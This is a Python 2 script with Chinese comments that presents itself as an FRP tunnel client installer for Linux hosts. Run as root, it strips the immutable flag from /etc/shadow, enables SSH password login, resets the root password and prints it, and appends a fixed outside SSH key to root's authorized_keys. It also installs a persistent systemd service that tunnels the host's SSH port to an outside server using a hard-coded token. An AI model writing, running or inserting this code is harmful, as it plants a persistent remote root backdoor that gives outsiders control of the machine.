#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import sys
import os
import time
import random
import string  # 用于生成随机密码

# 设置默认编码为UTF-8，解决中文显示问题
reload(sys)
sys.setdefaultencoding('utf-8')

def run_shell_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        if isinstance(result, bytes):
            result = result.decode('utf-8')
        return result
    except subprocess.CalledProcessError as e:
        # 返回错误码和输出，方便调试
        return "10002:{}".format(e.output.decode('utf-8', errors='ignore'))

def handle_shadow_immutable():
    """
    处理 /etc/shadow 的不可修改权限（i 权限）：
    - 检查文件是否有 i 权限，有则移除（chattr -i）
    - 没有则跳过，避免报错（适配 Python 2.7）
    """
    shadow_path = "/etc/shadow"
    try:
        if not os.path.exists(shadow_path):
            print u"警告：/etc/shadow 文件不存在，跳过权限处理"
            return
        
        # 移除 lsattr 的 -l 选项，直接检查紧凑格式中的 i 权限
        check_cmd = "lsattr %s | grep -q 'i'" % shadow_path
        check_result = subprocess.call(check_cmd, shell=True)
        
        if check_result == 0:
            print u"✓ 检测到 /etc/shadow 有不可修改权限（i），正在移除..."
            remove_cmd = "chattr -i %s" % shadow_path
            remove_result = run_shell_cmd(remove_cmd)
            if not remove_result.startswith("10002"):
                print u"✓ 成功移除 /etc/shadow 的不可修改权限"
            else:
                print u"警告：移除 /etc/shadow 不可修改权限失败：%s" % remove_result.split(":", 1)[1]
        else:
            print u"✓ /etc/shadow 无不可修改权限（i），无需处理"
    
    except Exception as e:
        print u"警告：处理 /etc/shadow 权限时发生异常：%s" % str(e)

def get_machine_id():
    cmd = "cat /etc/machine-id"
    result = run_shell_cmd(cmd)
    if result.startswith("10002"):
        print u"错误：无法获取机器ID：%s" % result.split(":", 1)[1]
        sys.exit(1)
    return result.strip()

def get_ssh_port(config_file='/etc/ssh/sshd_config'):
    ports = []
    try:
        with open(config_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if line.lower().startswith('port '):
                    try:
                        port = int(line.split()[1])
                        ports.append(port)
                    except (IndexError, ValueError):
                        print u"无效的端口配置，跳过：%s" % line
                        continue
    except Exception as e:
        print u"警告：无法读取 %s 文件：%s，使用默认端口22" % (config_file, str(e))
        return 22

    ports = list(set(ports))

    if 10666 in ports:
        return 10666
    return ports[0] if ports else 22

def configuration():
    return "\n".join([
        "[Unit]",
        "Description=Frp Client Service",
        "After=network.target",
        "",
        "[Service]",
        "Type=simple",
        "User=nobody",
        "Restart=on-failure",
        "RestartSec=5s",
        "ExecStart=/usr/bin/frpc -c /tmp/frp/frpc.ini",
        "ExecReload=/usr/bin/frpc reload -c /tmp/frp/frpc.ini",
        "LimitNOFILE=1048576",
        "",
        "[Install]",
        "WantedBy=multi-user.target",
        ""
    ])

def frpc():
    machine_id = get_machine_id()
    ssh_port = get_ssh_port()

    content = [
        "[common]",
        "admin_addr = 127.0.0.1",
        "admin_port = 58741",
        "",
        "server_addr = frp.9yb.life",
        "server_port = 57770",
        "token = b85cafa1f885d61cc1d8e1cf6c31b535",
        "",
        "log_file = /tmp/frp/tmp_frpc.log",
        "log_level = info",
        "log_max_days = 30",
        "",
        "heartbeat_interval = 10",
        "heartbeat_timeout = 30",
        "",
        "protocol = tcp",
        "tls_enable = false",
        "",
        "udp_packet_size = 1400",
        "",
        "[ssh:%s]" % machine_id,
        "type = tcp",
        "local_ip = 127.0.0.1",
        "local_port = %d" % ssh_port,  
        "remote_port = 0",
        "bandwidth_limit = 5MB",
        "",
        "health_check_type = tcp",
        "health_check_timeout_s = 30",
        "health_check_max_failed = 10",
        "health_check_interval_s = 300",
        "",
        "meta_deviceid = %s" % machine_id
    ]
    return "\n".join(content)

def ssh_keypub():
    run_shell_cmd("mkdir -p /root/.ssh")
    run_shell_cmd("chmod 700 /root/.ssh")
    run_shell_cmd("touch /root/.ssh/authorized_keys")
    run_shell_cmd("chmod 600 /root/.ssh/authorized_keys")
    
    path = "/root/.ssh/authorized_keys"
    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqm6DKCGmfy4cay+hbVFxUSojSayukX9/E8uAK/6OoC5yQCS4N77B8t/uX5Yn2Awapc9TqYkhO58MMqAM3+Kjxx8HIUPyMZ/OYxQ/pk92r9TkuRvoV90408sP1B1SnM64nVyrBiMlJ5GUM87e9ZKzIVRJtXzrZ5wDcsfejCPeUoSPxJUfJXmhUDAIyjqWnd9fZcKo6hspf8Ldtjigw+Jj7/Hi42Xs1OvMKWoiUNlkHqz4Dh9Rfda91+wRn/+3pqvx4gijxoP9eRh4at4yUfVjaEezoErma7zW27utehstRCyinMw5FiOVLbOYaHsEQLcECAmkKHTyuf2ALd5XyqCWF root@iZ2vcd3j77m73qd7tpcmnzZ"
    with open(path, 'r') as f:
        content = f.read()
        if key not in content:
            with open(path, 'a') as f:
                if content and not content.endswith('\n'):
                    f.write('\n')
                f.write(key + "\n")
            print u"✓ 已添加frps服务器的SSH公钥"
        else:
            print u"✓ SSH公钥已存在"

def create():
    if os.geteuid() != 0:
        print u"错误：此脚本必须以root用户身份运行"
        sys.exit(1)
    
    handle_shadow_immutable()
    
    run_shell_cmd("mkdir -p /tmp/frp/mxfrp")
    
    print u"✓ 正在启用SSH密码认证..."
    run_shell_cmd("sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config")
    run_shell_cmd("grep -q 'PasswordAuthentication' /etc/ssh/sshd_config || echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config")
    
    print u"✓ 正在重启SSH服务..."
    ssh_restart = run_shell_cmd("systemctl restart sshd || service ssh restart || service sshd restart")
    if ssh_restart.startswith("10002"):
        print u"警告：SSH服务重启失败：%s" % ssh_restart.split(":", 1)[1]
    
    # 生成随机8位root密码
    print u"✓ 正在生成随机8位root密码..."
    password_chars = string.ascii_uppercase.replace('O', '').replace('I', '') + \
                     string.ascii_lowercase.replace('o', '').replace('l', '') + \
                     string.digits.replace('0', '').replace('1', '')
    random.seed(os.urandom(10))
    root_password = ''.join(random.sample(password_chars, 8))
    
    # 核心修改：使用 passwd --stdin 非交互式设置密码（兼容性更强）
    # 兼容大多数Linux发行版（CentOS、Ubuntu、Debian等）
    set_pass_cmd = "echo -n '%s' | passwd --stdin root" % root_password
    pass_result = run_shell_cmd(set_pass_cmd)
    
    # 备用方案：如果 --stdin 不支持（极少数系统），用 chpasswd 并指定编码
    if pass_result.startswith("10002"):
        print u"✓ 尝试备用密码设置方案..."
        set_pass_cmd = "echo 'root:%s' | LC_ALL=C chpasswd" % root_password
        pass_result = run_shell_cmd(set_pass_cmd)
    
    if pass_result.startswith("10002"):
        error_msg = pass_result.split(":", 1)[1] if ":" in pass_result else "未知错误"
        print u"✗ 警告：设置root密码失败！错误信息：%s" % error_msg
    else:
        print u"✓ root随机密码生成并设置成功"
    
    ssh_keypub()
    
    run_shell_cmd("chown -R nobody:nobody /tmp/frp")
    run_shell_cmd("chmod -R 755 /tmp/frp")
    print u"✓ 已设置frp目录权限"
    
    service_file = "/etc/systemd/system/tmp_frpc.service"
    config_file = "/tmp/frp/frpc.ini"

    with open(service_file, 'w') as f:
        f.write(configuration())

    with open(config_file, 'w') as f:
        f.write(frpc())

    run_shell_cmd("systemctl daemon-reload")
    run_shell_cmd("systemctl enable tmp_frpc.service")
    run_shell_cmd("systemctl restart tmp_frpc.service")
    
    # 检查服务状态
    status_result = run_shell_cmd("systemctl is-active tmp_frpc.service")
    if "active" in status_result:
        print u"✓ Frp客户端服务启动成功"
    else:
        print u"✗ Frp客户端服务启动失败，请检查日志：%s" % status_result
    
    print u"\n=== 连接信息 ==="
    print u"SUCCESS：Frp隧道已成功建立！"
    print u"远程端口：请访问 http://47.109.62.147:7500/static/#/proxies/tcp 获取"
    print u"连接命令：ssh root@frp.9yb.life -p （远程端口）"
    print u"root随机密码：%s" % root_password
    
    print u"\n查看frpc日志：tail -f /tmp/frp/tmp_frpc.log"

if __name__ == "__main__":
    create()